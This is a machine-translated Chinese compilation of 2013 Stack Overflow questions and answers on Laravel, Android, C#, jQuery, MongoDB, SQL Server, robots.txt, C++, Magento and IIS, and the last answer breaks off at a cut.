举个例子：我想知道是否`DB::insert()`返回插入行的 id。于是我开始寻找。1\. 我找到了“封装”数据库的 Illuminate\Support\Facades\Facade 类。2\. 调用了 resolveFacadeInstance 函数，然后我尝试打印这些数组，但我的计算机挂起：-/。而且我确信这会导致更多我无法理解的课程。

有没有办法可以尝试学习 Laravel 4 的内部工作原理？也许堆栈跟踪？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-01-15T23:29:30.840

外观类只是一个过滤器类，允许您调用方法，就好像它们是静态的一样。对于外观映射，请访问此处： http: [//laravel.com/docs/facades#facade-class-reference](http://laravel.com/docs/facades#facade-class-reference)

充分理解 laravel 内部工作的起点应该是：

```
/public/index.php 
```

您可以遵循程序的逻辑，注意需要 start.php，它会加载“应用程序”的实例，该实例位于此处：

```
/vendor/laravel/framework/src/Illuminate/Foundation/Application.php 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-03T13:15:15.000

[这个 Tuts+ 视频](https://tutsplus.com/lesson/when-they-say-laravel-shouldnt-use-static-methods/)展示了几种找出哪个班级实际在做这项工作的方法。

例如：

```
$root = get_class(DB::getFacadeRoot());
var_dump($root); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-22T15:44:25.290

实际的 Laravel 4 代码在文件中有很好的记录。如果您想了解内部工作原理，请打开源代码文件并阅读注释。例如，我在 /vendor/laravel/framework/src/Illuminate/Foundation/Application.php 中查找了 DB::insert() 代码。

```
/**
 * Run an insert statement against the database.
 *
 * @param  string  $query
 * @param  array   $bindings
 * @return bool
 */
public function insert($query, $bindings = array())
{
    return $this->statement($query, $bindings);
} 
```

好的，所以这是调用语句函数，所以我在同一代码/类中搜索函数语句：

```
/**
 * Execute an SQL statement and return the boolean result.
 *
 * @param  string  $query
 * @param  array   $bindings
 * @return bool
 */
public function statement($query, $bindings = array())
{
    return $this->run($query, $bindings, function($me, $query, $bindings)
    {
        if ($me->pretending()) return true;

        $bindings = $me->prepareBindings($bindings);

        return $me->getPdo()->prepare($query)->execute($bindings);
    });
} 
```

我们现在可以看到，这会根据代码上方的注释返回布尔结果。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-16T00:59:04.560

你可以在这里查看 Laravel 4 的早期文档：http://four.laravel.com/——[这](http://four.laravel.com/)应该会给你一个很好的起点

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-05-07T20:51:36.777

如果你来自 Laravel 3 [，这篇文章](http://jasonlewis.me/article/laravel-4-illuminating-your-laravel-3-applications)适合你。之后，您应该阅读该系列的[其他教程](http://jasonlewis.me/laravel-tutorials)。

作者注：

> *本文应该概述 Laravel 版本 3 和即将发布的版本 4 之间的一些更重要的更改。请记住，这并不是所有更改。随着 Laravel 4 的发布越来越近，我会及时更新这篇文章。如果你对 Laravel 4 有任何问题，请跳到 Freenode 上的[#laravel](http://laravel.com/irc)。此时，我们希望人们不要在论坛上发布帮助主题。*

# java - Android 的 InputManager::registerInputDeviceListener 没有调用我的监听器

> ID：14348103
> 
> 赞同：5
> 
> 时间：2013-01-15T22:28:32.913
> 
> 标签：java, android

我试图在添加/删除输入设备时收到通知，据我所知，这就是 registerInputDeviceListener 应该做的......但我的监听器没有被调用！

这是我的代码片段：

```
InputManager im = (InputManager) getSystemService(Context.INPUT_SERVICE);
im.registerInputDeviceListener(new InputManager.InputDeviceListener() {
    @Override
    public void onInputDeviceAdded(int deviceId) {
        Log.d("Input", "InputDeviceAdded: " + deviceId);
    }

    @Override
    public void onInputDeviceRemoved(int deviceId) {
            Log.d("Input", "InputDeviceRemoved: " + deviceId);
    }

    @Override
    public void onInputDeviceChanged(int deviceId) {
        Log.d("Input", "InputDeviceChanged: " + deviceId);
    }
}, null); 
```

这是我拔下 USB 鼠标时在 logcat 中看到的内容：

```
01-15 19:19:04.025: INFO/EventHub(5935): Removing device '/dev/input/event0' due to inotify event
01-15 19:19:04.025: INFO/EventHub(5935): Removed device: path=/dev/input/event0 name=Primax USB OPTICAL MOUSE id=11 fd=245 classes=0x80000008
01-15 19:19:04.045: INFO/InputReader(5935): Device removed: id=11, name='Primax USB OPTICAL MOUSE', sources=0x00002002 
```

但我的听众永远不会被叫到......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-17T23:06:41.440

事实证明，除非之前调用了 getInputDevice 或 getInputDeviceByDescriptor，否则 InputManager 不会为设备更改注册自身。

首先调用 getInputDevice（并忽略结果）使我的回调被调用。

# html - 输入元素之间的额外空白

> ID：14348104
> 
> 赞同：3
> 
> 时间：2013-01-15T22:28:49.490
> 
> 标签：html, css, twitter-bootstrap, html5-canvas

我正在尝试删除所有表单元素的两个输入字段之间的空白。我降低了高度，但之后下一个标签上升了，你能告诉我如何删除它吗

[http://jsfiddle.net/DA9gK/18/](http://jsfiddle.net/DA9gK/18/)

```
<div class="control-group">
                    <label class="control-label" for="inputEmail">Company Name</label>
                    <div class="controls">
                      <input type="text" id="inputEmail">
                    </div>
                  </div>
                  <div class="control-group">
                      <label class="control-label" for="inputEmail">Contact Name</label>
                      <div class="controls">
                        <input type="text" id="inputEmail">
                      </div>
                  </div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:35:53.500

我认为现在没有人可以帮助你。你这里有大麻烦。用 HTML 和 CSS 窗口更新 jsfiddle。顺便说一句 - 你正在写关于标签中的填充或边距样式 imo。（边距底部：0）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T22:35:01.037

这是因为`label.control-label`. 删除顶部填充或底部边距。（我认为删除边距看起来更好。）

```
label.control-label {
  margin-bottom: 0;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T22:38:59.407

~~我认为这应该可以解决您的问题，我已经在那里回答了。谢谢你。[表单域中的按钮对齐](https://stackoverflow.com/questions/14347117/button-alignment-in-form-fields/14347496#14347496)~~

该死！对于不正确的快速答案，我深表歉意，好的，我已经解决了您的问题，问题出在您正在导入的 css 文件中。“ [http://twitter.github.com/bootstrap/assets/css/bootstrap.css](http://twitter.github.com/bootstrap/assets/css/bootstrap.css) ”并且您的元素正在从它继承样式属性，并且您的空白问题恰好在明确定义的“第1945行”上

```
.form-horizontal .controls {
*display: inline-block;
*padding-left: 20px;
margin-left: 180px;
*margin-left: 0; 
```

所以要么你必须手动覆盖这些，要么使用旧的“！important”属性。

PS：您必须将“margin-left”属性值编辑为 160px 或您喜欢的值。

# c# - 按其内容的大小拆分 double 的集合

> ID：14348107
> 
> 赞同：4
> 
> 时间：2013-01-15T22:29:09.823
> 
> 标签：c#, .net, linq

我有一个数字集合（Collection），它可以是任意大小，并且包含负数和正数。我试图根据一些标准将其拆分。从集合中的第一个数字开始，我想在该数字高于 -180 和低于 180 时进行集合。任何高于 180 的数字都将进入新集合，或者任何低于 -180 的数字将进入新集合。如果数字再次进入可接受的参数范围内，那么它们将再次进入新集合。问题是收藏品需要保持井井有条。

例如。

收集 100 个：

*   前 50 个介于 180 和 -180 之间。
*   接下来的20个低于-180
*   接下来的20个都在180以上
*   最后 10 个在 180 到 -180 之间

从上面的集合中，我现在应该有 4 个单独的集合，其顺序与原始 1 个集合的顺序相同。

*   原始顺序中的第一个集合编号在 180 和 -180 之间
*   原序中的第二个收集号低于-180
*   原序第三集编号180以上
*   原始顺序的第四个集合编号在 180 和 -180 之间

我做了一个尝试，我所拥有的不起作用，而且是一堆令人讨厌的 if 语句。我不太了解linq，但我认为使用它可能会有更优雅的解决方案。任何人都可以在这里帮助我，向我展示如何创建 linq 语句或建议如何让我的 if 语句工作，如果这是最好的方法。

```
Collection<Tuple<Collection<double>, int>> collectionOfDataSets = new Collection<Tuple<Collection<double>, int>>();
Collection<double> newDataSet = new Collection<double>();
for (int i = 0; i < dataSet.Count; i++) {
    if (dataSet[i] < 180 && dataSet[i] > -180) {
        newDataSet.Add(dataSet[i]);
    } else {
        Tuple<Collection<double>, int> lastEntry = collectionOfDataSets.LastOrDefault(b => b.Item2 == i--);
        if (lastEntry != null){
            lastEntry.Item1.Add(dataSet[i]);
        }
        double lastInLastCollection = collectionOfDataSets.ElementAtOrDefault(collectionOfDataSets.Count).Item1.Last();
        if (newDataSet.Count > 0 && lastInLastCollection!= dataSet[i]){
            collectionOfDataSets.Add(new Tuple<Collection<double>, int>(newDataSet, i));                        
        }
        newDataSet = new Collection<double>();
    }
} 
```

提前感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:46:15.260

你的例子很复杂。我将首先陈述并解决一个更简单的问题，然后使用相同的方法解决您原来的问题。

* * *

我想将数字列表拆分为偶数和奇数的*连续组。*例如，给定列表，`2,2,4,3,6,2`我会将其分为*三*组`[2,2,4], [3], [6,2]`

这可以通过[GroupAdjacentBy](https://gist.github.com/2277055)方法简洁地完成

```
> var numbers = new List<int>{2,2,4,3,6,2};
> numbers.GroupAdjacentBy(x => x % 2)
[[2,2,4], [3], [6,2]] 
```

* * *

要解决您的问题，只需将上面的奇偶分类函数替换为您的分类函数：

```
> var points = new List<int>{-180,180};
> var f = new Func<int,int>(x => points.BinarySearch(x));
> var numbers = new List<int>{6,-50,100,190,200,20};
> numbers.GroupAdjacentBy(f)
[[6,-50,100], [190,200], [20]] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T22:40:54.767

如果您需要在值更改后立即更新集合，为什么不使用属性？就像是

```
// your original collection
public IList<double> OriginalValues; //= new List<double> { -1000, 5, 7 1000 };

public IList<double> BelowMinus180
{
   get { return OriginalValues.Where(x => x < -180).ToList().AsReadOnly(); }
}

public IList<double> BetweenMinus180And180
{
   get { return OriginalValues.Where(x => x >= -180 && x <= 180).ToList().AsReadOnly(); }
}

public IList<double> Above180
{
   get { return OriginalValues.Where(x => x > 180).ToList().AsReadOnly(); }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T22:43:03.733

```
public static List<List<T>> PartitionBy<T>(this IEnumerable<T> seq, Func<T, bool> predicate)
{
    bool lastPass = true;
    return seq.Aggregate(new List<List<T>>(), (partitions, item) =>
    {
        bool inc = predicate(item);
        if (inc == lastPass)
        {
            if (partitions.Count == 0)
            {
                partitions.Add(new List<T>());
            }
            partitions.Last().Add(item);
        }
        else
        {
            partitions.Add(new List<T> { item });
        }
        lastPass = inc;
        return partitions;
    });
} 
```

然后你可以使用：

```
List<List<double>> segments = newDataSet.PartitionBy(d => d > -180 && d < 180); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T22:56:06.960

这个可能的解决方案使用两遍如何。在第一遍中，我们发现索引发生了变化，在第二遍中，我们进行了实际的分区。首先是确定类别的辅助方法：

```
 protected int DetermineCategory(double number)
    {
        if (number < 180 && number > -180)
            return 0;
        else if (number < -180)
            return 1;
        else
            return 2;
    } 
```

然后是实际的算法：

```
 List<int> indices = new List<int>();
    int currentCategory = -1;
    for (int i = 0; i < numbers.Count; i++)
    {
        int newCat = DetermineCategory(numbers[i]);
        if (newCat != currentCategory)
        {
            indices.Add(i);
            currentCategory = newCat;
        }
    }
    List<List<double>> collections = new List<List<double>>(indices.Count);
    for (int i = 1; i < indices.Count; ++i)
        collections.Add(new List<double>(
            numbers.Skip(indices[i - 1]).Take(indices[i] - indices[i - 1]))); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T23:33:23.753

这是基于您提供的新信息的新答案。我希望这一次我会更接近你所需要的

```
public IEnumerable<IList<double>> GetCollectionOfCollections(IList<double> values, IList<double> boundries)
{
    var ordered = values.OrderBy(x => x).ToList();
    for (int i = 0; i < boundries.Count; i++)
    {
        var collection = ordered.Where(x => x < boundries[i]).ToList();
        if (collection.Count > 0)
        {
            ordered = ordered.Except(collection).ToList();
            yield return collection.ToList();
        }
    }
    if (ordered.Count() > 0)
    {
        yield return ordered;
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-01-16T00:56:58.197

一种使用 linq 的方法。未经测试，但应该可以工作

```
var firstSet = dataSet.TakeWhile(x=>x>-180&&x<180);
var totalCount = firstSet.Count();
var secondSet = dataSet.Skip(totalCount).TakeWhile(x=>x<-180);
totalCount+=secondSet.Count();
var thirdSet = dataSet.Skip(totalCount).TakeWhile(x=>x>180);
totalCount += thirdSet.Count();
var fourthSet = dataSet.Skip(totalCount); 
```

# java - TextWatcher 未在活动中更新的问题

> ID：14348115
> 
> 赞同：-1
> 
> 时间：2013-01-15T22:29:42.077
> 
> 标签：java, android

每次用户更改输入时，我都会尝试重新计算，因此我使用了 TextWatcher。它会在更改文本时计算应用程序何时启动，当我输入新值时它不会重新计算。有人可以告诉我我做错了什么吗？使用“onTextChanged”是否正确，我是否必须将整个计算放在该过程中，还是只调用变量一和二变量？请忽略微调器。提前致谢。

公共类 AndroidActivity 扩展 Activity 实现 TextWatcher{

```
 private Spinner spinner1; 

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.pounds);
    addListenerOnSpinnerItemSelection();

    int one = 0;
    int two = 0;

    try{
      EditText one100lbs = (EditText) findViewById(R.id.one100lbs);
      one = Integer.valueOf(one100lbs.getText().toString().trim());
    }
    catch (NumberFormatException e)
    {
      one = -1;
    }

    try{
      EditText tenPounds = (EditText) findViewById(R.id.tenPounds);
      two = Integer.valueOf(tenPounds.getText().toString().trim()); 
    }
    catch (NumberFormatException e)
    {
      two = -1;
    }

    int result = one + two;

    TextView textView = (TextView) findViewById(R.id.editText1);
    textView.setText(String.valueOf(result)); 

}

//create spinner 
public void addListenerOnSpinnerItemSelection() {
    spinner1 = (Spinner) findViewById(R.id.other_spinner);
    spinner1.setOnItemSelectedListener(new CustomOnItemSelectedListener());
  }

@Override
public void afterTextChanged(Editable s) {
    // TODO Auto-generated method stub
}

@Override
public void beforeTextChanged(CharSequence s, int start, int count,
        int after) {    
    // TODO Auto-generated method stub
}
@Override
public void onTextChanged(CharSequence s, int start, int before, int count) {
    // TODO Auto-generated method stub

    int one = 0;
    int two = 0;

    try{
      EditText one100lbs = (EditText) findViewById(R.id.one100lbs);
      one = Integer.valueOf(one100lbs.getText().toString().trim());
    }
    catch (NumberFormatException e)
    {
      one = -1;
    }

    try{
      EditText tenPounds = (EditText) findViewById(R.id.tenPounds);
      two = Integer.valueOf(tenPounds.getText().toString().trim()); 
    }
    catch (NumberFormatException e)
    {
      two = -1;
    }

    int result = one + two;

    TextView textView = (TextView) findViewById(R.id.editText1);
    textView.setText(String.valueOf(result)); 
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T22:34:22.110

看来您缺少`textview`与`TextWatcher`.

你需要做一些类似于绑定`textview`的事情`TextWatcher`：

```
text = (EditText)findViewById(R.id.yourTextField);
text.addTextChangedListener(this); 
```

阅读本[教程](http://karanbalkar.com/2012/10/tutorial-11-using-textwatcher-in-android/)以获取简单示例。

# javascript - 如何在自动刷新之前检查可用性？

> ID：14348118
> 
> 赞同：1
> 
> 时间：2013-01-15T22:29:55.633
> 
> 标签：javascript, jquery

我想定期更新网页，并且我希望浏览器仅在页面可用时更新。正确的 nov 我正在使用这个：

```
<script language="javascript" type="text/javascript">
    $(document).ready(function() {
        setInterval("location.reload()", 66000);
    });   
</script> 
```

如果由于某种原因页面不可用，是否可以**不更新？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:32:43.957

您可以[`ajax`](http://api.jquery.com/jQuery.ajax)提前检查一个微小的资源，例如：

```
$(document).ready(function() {
    setInterval(maybeRefresh, 66000);

    function maybeRefresh() {
        $.ajax({
            url:     "/path/to/tiny/resource",
            type:    "GET",
            success: function() {
                // That worked, do the full refresh
                location.reload();
            }
        });
    }
}); 
```

...但我倾向于认为你最好只[`load`](http://api.jquery.com/load)更新更新的内容。将所有主要内容放在一个带有 , 的元素中`id` `"main"`，然后：

```
$(document).ready(function() {
    setInterval(function() {
        $("#main").load("/path/to/new/content");
    }, 66000);
}); 
```

这会将元素的内容替换为从to`#main`接收到的内容。如果失败，则不更新。`GET``/path/to/new/content``GET`

我可能还会使用链式`setTimeout`而不是 a`setInterval`并通过尝试更积极地刷新来处理错误。就像是：

```
$(document).ready(function() {
    setTimeout(refresh, 66000);

    function refresh() {
        $.ajax({
            url: "/path/to/new/content",
            type: "GET",
            success: function(html) {
                // Success, update the content
                $("#main").html(html);

                // Reload in 66 seconds
                setTimeout(refresh, 66000);
            },
            error: function() {
                // Failed, try again in five seconds
                setTimeout(refresh, 5000);
            }
        });
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T22:36:58.427

您可能想要使用 HTML5 缓存清单功能。为此，请在`html`元素的`manifest`属性中指定清单文件路径：

```
<!DOCTYPE HTML>
<html manifest="cache.manifest"> 
```

然后将网站的所有资源添加到清单文件中，例如：

```
CACHE MANIFEST
# v11
/index.html
/main/features.js
/main/settings/index.css
http://example.com/images/scene.jpg
http://example.com/images/world.jpg 
```

现在，如果您对 index.html 执行 GET 请求，浏览器将仅在缓存清单文件可用且已更改时才会执行实际请求（为了强制更新，您可以在缓存清单注释中存储版本号并需要时更新它）。否则，页面将从浏览器的缓存中重新加载。

# mongodb - 使用 VMC 隧道恢复 Mongodb 数据库失败

> ID：14348124
> 
> 赞同：0
> 
> 时间：2013-01-15T22:30:08.403
> 
> 标签：mongodb, cloud-foundry, vmc

我已成功将应用程序发布到 CloudFoundry。当我尝试使用 VMC 隧道和 mongorestore 为数据库播种时，仅传输了部分数据。恢复过程在集合的一部分中挂起。如果我使用 mongorestore 将转储恢复到我的本地 mongo 实例，它运行良好。

```
$vmc tunnel energy mongorestore 
Opening tunnel on port 10000... OK
Waiting for local tunnel to become available... OK
Directory or filename to restore from> ./dump/energy

connected to: localhost:10000 
Wed Jan 16 09:22:25 ./dump/energy/twohourlyhistoryDatas.bson
Wed Jan 16 09:22:25     going into namespace [db.twohourlyhistoryDatas]
Wed Jan 16 09:22:27 warning: Restoring to db.twohourlyhistoryDatas without dropping.
   Restored data will be inserted without raising errors; check your server log
   795 objects found
Wed Jan 16 09:22:27     Creating index: { key: { _id: 1 }, ns: "db.twohourlyhistoryDatas", name: "_id_" } 
```

我已经离开这个几个小时了，它还没有完成。使用网络监视器，我可以看到数据正在传输 10-15 秒，然后突然停止。为 vmc 打开详细模式没有出现任何故障。使用相同的命令直接运行 mongorestore 并且非常详细的输出也没有说明问题。

除此之外，使用 CloudFoundry 非常容易。欢迎任何关于现在在哪里寻找解决问题的建议！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T14:01:22.733

数据库有大小限制（对于 Mongo，它是 240Mb），而且隧道上的操作也有时间限制，数据库有多大？

# sql-server - 限制 SQL Server 日志文件增长率

> ID：14348125
> 
> 赞同：1
> 
> 时间：2013-01-15T22:30:11.467
> 
> 标签：sql-server, sql-server-2008, sql-server-2008-r2, sql-server-2012

我有一个包含 23 亿行和 76GB 大小的大型数据库。

我的问题是我想将列类型转换为`smalldatetime`但在此操作期间 .ldf 文件变得如此之大以至于占用了我的整个磁盘空间（它达到了 350gb）然后查询退出并出现错误。

有什么办法可以让 .ldf 变小吗？

我从选项中缩小了我的 .ldf。

数据库恢复模式设置为简单。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:33:47.143

添加一个新的 smalldatetime 类型的可为空列。然后慢慢地（例如，10-100k 行的批次）通过根据旧列值设置其值来填充该列。一旦所有行在新列中都有值，删除旧行并将新行重命名为旧行名称。

这将确保没有事务变得大到足以严重影响您的日志文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T01:24:41.400

这是最终代码：我现在运行它，所以明天我会知道它是否 100% 好，但它似乎可以工作

```
 WHILE (2 > 1) 
  BEGIN 
    BEGIN TRANSACTION 
    UPDATE TOP ( 10000 ) [ais].[dbo].[imis position report]
    SET    [time2] = convert(smalldatetime, left(date, 19)) 
     IF @@ROWCOUNT = 0 
      BEGIN 
        COMMIT TRANSACTION 
         BREAK 
      END 
    COMMIT TRANSACTION 
    -- 1 second delay
    WAITFOR DELAY '00:00:01'
  END -- WHILE
GO 
```

# c# - 如何使用 ServiceStack 和 Funq.Container 解决 ILog

> ID：14348126
> 
> 赞同：1
> 
> 时间：2013-01-15T22:30:20.810
> 
> 标签：c#, inversion-of-control, servicestack, funq

ServiceStack AppHost 提供了一个 Funq.Container 用于注册可以在构造时注入到服务中的类型。这个容器是否可以用于注册一个 ILog 工厂，该工厂返回一个适合其所在类型的 ILog？

换句话说，给定以下 AppHost：

```
public class AppHost : AppHostBase
{
    public AppHost() : base("Example Web Services", Assembly.GetExecutingAssembly())
    {
    }

    public override void Configure(Funq.Container container)
    {
        var baseLogFactory = new ServiceStack.Logging.NLogger.NLogFactory();
        LogManager.LogFactory = new ServiceStack.Logging.Elmah.ElmahLogFactory(baseLogFactory);
        // Would prefer to register a Func<Type, ILog> one time here
    }
} 
```

和服务：

```
public class FooService : IService<FooRequest>
{
    static ILog Log { get { return LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType); } }
    // Would prefer:
    // public ILog { get; set; }

    public object Execute(FooRequest request)
    {
        Log.Info("Received request: " + request.Dump());
        return new FooResponse();
    }
} 
```

有什么我可以添加到 AppHost.Configure 以避免在我的所有服务中使用静态 ILog 样板的（而只是使用普通的旧 ILog 属性）？

第三种方式，最简洁地说，我可以使用 Funq.Container 进行 ILog 注入而不是 LogManager 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:52:23.513

```
container.Register<ILog>(
    ctx => LogManager.LogFactory.GetLogger(typeof(IService))
); 
```

现在您的服务可能如下所示：

```
public class FooService : IService<FooRequest>
{
    public ILog { get; set; }

    public object Execute(FooRequest request)
    {
        Log.Info("Received request: " + request.Dump());
        return new FooResponse();
    }
} 
```

# web-crawler - robots.txt Disallow: /click 什么是不允许的？

> ID：14348127
> 
> 赞同：0
> 
> 时间：2013-01-15T22:30:21.087
> 
> 标签：web-crawler, robots.txt

我想抓取一个网站。它的 robots.txt 文件中有以下内容，但我不确定他们不希望我做什么：

```
User-agent: *
Disallow: /click 
```

没有点击子目录。或者他们不希望我访问通常需要单击的任何内容（例如通过表单提交数据）？在任何情况下，他们肯定不会让事情变得容易 - 主页的表单获取到设置由第三页读取的 cookie 的站点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T17:19:28.933

这意味着任何机器人都不应该抓取路径以字符串**开头的***任何*URL 。**`click`**

 **例如，应阻止以下 URL：

*   `example.com/click`
*   `example.com/click.html`
*   `example.com/click/`
*   `example.com/click/foo/bar`
*   `example.com/clicker`

以下 URL 仍将被允许：

*   `example.com/foo/click`
*   `example.com/fooclick`
*   `example.com/clic`

[您可以在http://www.robotstxt.org/wc/robots.html](http://www.robotstxt.org/wc/robots.html)找到原始 robots.txt 规范。**

# c++ - 错误 C2664：“方式”：无法将参数 4 从“int”转换为“int &”

> ID：14348134
> 
> 赞同：1
> 
> 时间：2013-01-15T22:30:41.170
> 
> 标签：c++

我的代码有问题。

这是我的主要内容。

```
int main()
{
    cin>>xG>>yG;
    int x,y;
    cin>>x>>y;
    int crrWay[200] = {0},
        minWay[200] = {0},
        minWayN = -1;
    way(x, y, crrWay, 0, 0, minWay, minWayN, 0);
    printWay(minWay, minWayN);
    return 0;
} 
```

这就是功能。

```
void way(int x, int y, int *crrWay, int& crrWayWeight, int l, int* minWay, int& minWayN, int& minWayWeight)
{
    crrWay[2*l] = x;
    crrWay[2*l+1] = y;

    if( x < 0 || y < 0 || x > 10 || y > 10 )
        return;

    // Сравнява намерения път с минималния
    if(x == xG && y == xG)
    {
        registerWay(crrWay, l+1, minWay, minWayN, crrWayWeight, minWayWeight);
        return;
    }

    // Клетката е непроходима.
    if(tempMaze[x][y]==0)
        return;
    tempMaze[x][y] = 0;
    crrWayWeight+=maze[x][y];

    // Рекурсивни обръщения към всеки от четирите съседа
    way(x+1, y, crrWay, crrWayWeight, l+1, minWay, minWayN, minWayWeight);
    way(x, y+1, crrWay, crrWayWeight, l+1, minWay, minWayN, minWayWeight);
    way(x-1, y, crrWay, crrWayWeight, l+1, minWay, minWayN, minWayWeight);
    way(x, y-1, crrWay, crrWayWeight, l+1, minWay, minWayN, minWayWeight);

    // връщане назад
    tempMaze[x][y] = 1;
} 
```

代码无法编译。它说

> 1>c:\users\admin\documents\zad51.cpp(102): 错误 C2664: 'way' : 无法将参数 4 从 'int' 转换为 'int &'

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T22:32:28.580

您的`way`函数采用非常量引用`int&`，并且您正在传递诸如`0`. 非常量引用不能绑定到临时对象。您需要更改签名以获取 const 引用，或者，如果函数实际上改变了所引用的整数，则不要传递临时变量。

```
void way(int x, int y, int *crrWay, const int& crrWayWeight, int l, int* minWay, const int& minWayN, const int& minWayWeight); 
```

或者

```
int a = 0;
int b = 0;
int c = 0;
way(x, y, crrWay, a, b, minWay, minWayN, c); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T22:32:59.653

该`way`函数将整数的引用作为其第四个参数。您不能传递文字（又名右值）。对对象的引用始终是左值或变量。您应该做的是创建一个变量并将其传递给函数调用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T22:33:46.670

因为您尝试将常量文字作为第四个参数传递。将其分配给变量，即：

```
int variable = 0;
way(x, y, crrWay, variable, 0, minWay, minWayN, 0); 
```

# javascript - JQuery 在加载时切换自动折叠 div。不想要，不知道为什么

> ID：14348135
> 
> 赞同：1
> 
> 时间：2013-01-15T22:30:43.337
> 
> 标签：javascript, jquery, html, css

我没有看到这个问题的任何答案，但我遇到了这个问题：

我制作了一个 JQuery 菜单 UI，它工作得很好。

当您单击列表项中的第一个链接时，列表项应该展开以显示其余链接。

然而！当页面加载时，似乎连接到第一个链接的 .toggle() 正在自动折叠该第一个链接。我想不通。

再次重申：第一个链接“a.cat”在页面加载时被折叠。它不习惯，我不确定我何时或是否改变了它......）。

**编辑** [这是 jsFiddle。](http://jsfiddle.net/g2avityhitz/acraZ/5/)

无论如何，我希望这足够清楚。我会定期回来回答问题。

这是 JS，因为 SO 需要它：

```
$("#sidebar ul li a.cat").toggle( function () {

    $(this).stop(true).animate({
        "color" : "#fff"
    });

    var growTo = (parseInt($(this).siblings("a.link").length) * nmMenu.linkHeight) + nmMenu.catHeight;

    $(this).parent("li").stop(true).animate({
        "height"        : growTo + "px",
        "padding-top"   : "5px"
    }, function () {
        $(this).children("a").stop(true).animate({
            "margin-left"   : "20px"
        });
    });

}, function () {

    $(this).siblings("a").andSelf().stop(true).animate({
        "margin-left"   : "0px"
    }, function () {
        $(this).siblings(" a:first").stop(true).animate({
            "margin-bottom" : nmMenu.catMarginBottom + "px",
            "color" : nmMenu.linkColor
        }); 

        $(this).parent("li").stop(true).animate({
            "height"    : nmMenu.catHeight + "px"
        });
    }); 
```

# magento - Magento 中的 Javascript 位置

> ID：14348137
> 
> 赞同：0
> 
> 时间：2013-01-15T22:30:46.703
> 
> 标签：magento, magento-1.4

我试图在代码库中找到某些 JavaScript 代码，但没有运气。此代码出现在每一页的头部。请注意，它不是指向文件的链接，而是嵌入在头部的某些代码。我尝试了以下方法但没有运气

1.  本地.xml
2.  头.phtml
3.  page.phtml 和所有页面模板
4.  页面.xml
5.  使用关键字和关键字“{variablename}”在代码库中进行文本搜索
6.  数据库搜索关键字“{variablename}”

但目前没有结果

有什么遗漏吗？任何帮助将非常感激。

谢谢，洛芙琳

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T18:31:15.783

假设页面模板仍然普遍反映原生 Magento 结构，如果它在`<head>`页面中，那么它只能来自以下三个地方之一：

*   页面模板（1column.phtml、3columns.phtml 等）。
*   `<head>`包含文件 head.phtml 。
*   包括前两个之一。

我知道您说过您已经查看了这两个地方，但是您可以通过比较您在这些位置看到的内容与您在生成的页面源中看到的内容来帮助缩小来源范围。您尝试查找的分析代码是在您可以在这些模板文件中看到的内容之前还是之后？

还要确保您正在查看正确主题的模板文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T20:48:11.270

好的..它在系统>配置>设计>杂项脚本下

# c# - DirectoryEntry IIS 访问权限

> ID：14348141
> 
> 赞同：5
> 
> 时间：2013-01-15T22:31:17.997
> 
> 标签：c#, windows, security, iis, iis-8

我有一个控制台应用程序，它列出了 IIS 中的网站绑定

```
using (var directoryEntry = new DirectoryEntry("IIS://localhost/w3svc/" + GetWebSiteId())) {
    var bindings = directoryEntry.Properties["ServerBindings"]; 
} 
```

我通过进程从 ASP.NET 调用此控制台应用程序

```
var process = new Process {
   StartInfo = new ProcessStartInfo {
       FileName = "c:/app.exe",
       Arguments = "check",
       UseShellExecute = false,
       RedirectStandardOutput = true,
       CreateNoWindow = true
    }
}; 
```

在 Widows 7 / IIS 7.5 下的开发机器上一切正常，但是当我在 Windows 2012 / IIS 8 上测试时，我得到“访问被拒绝”错误。

错误日志

```
"System.Runtime.InteropServices.COMException (0x80070005): Access is denied.
at System.DirectoryServices.DirectoryEntry.Bind(Boolean throwIfFail)
at System.DirectoryServices.DirectoryEntry.Bind()
at System.DirectoryServices.DirectoryEntry.get_IsContainer()
at System.DirectoryServices.DirectoryEntries.ChildEnumerator..ctor(DirectoryEntry container)
at System.DirectoryServices.DirectoryEntries.GetEnumerator()
at IISSubdomainManagement.Program.GetWebSiteId()
at IISSubdomainManagement.Program.TotalBindings()
at IISSubdomainManagement.Program.Main(String[] args)" 
```

ps 应用程序池标识为“ApplicationPoolIdentity”

* * *

我忘了提一下，当我从 CMD 运行控制台应用程序时，它在我的服务器上运行良好

* * *

## 回答 #1

> 赞同：2
> 
